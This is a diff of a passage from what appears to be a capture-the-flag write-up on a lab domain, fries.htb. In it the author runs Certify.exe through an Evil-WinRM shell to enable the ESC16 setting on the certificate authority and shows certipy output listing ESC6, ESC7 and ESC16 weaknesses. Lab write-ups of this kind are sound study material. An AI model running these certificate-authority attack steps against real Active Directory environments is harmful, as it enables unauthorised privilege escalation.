@@ -1209,7 +1209,7 @@ And now re running certipy i see that its now vulnerable to ESC6
 However i still cannot get this to work, after some research modern AD networks require you to enable both esc6 and esc16
 
 ```python
-*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> .\Certify.exe manage-ca --ca "DC01.fries.htb\fries-DC01-CA" --esc6 --esc16
+*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> .\Certify.exe manage-ca --ca "DC01.fries.htb\fries-DC01-CA" --esc16
 
    _____          _   _  __
   / ____|        | | (_)/ _|
@@ -1240,6 +1240,18 @@ Certify completed in 00:00:00.6050693
 ```
 
 Now that is enabled
+
+```python
+    [!] Vulnerabilities
+      ESC6                              : Enrollee can specify SAN.
+      ESC7                              : User has dangerous permissions.
+      ESC16                             : Security Extension is disabled.
+    [*] Remarks
+      ESC6                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
+      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
+```
+
+Now its all setup 
 
 ```python
 
